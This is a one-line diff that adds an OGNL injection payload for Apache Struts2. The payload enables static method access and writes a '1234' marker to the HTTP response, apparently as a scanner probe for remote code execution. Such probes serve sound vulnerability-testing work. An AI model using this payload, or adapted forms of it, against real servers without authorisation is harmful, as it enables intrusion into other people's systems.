@@ -1,0 +1,1 @@
+a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a.println(0x31323334),%23a.close())}
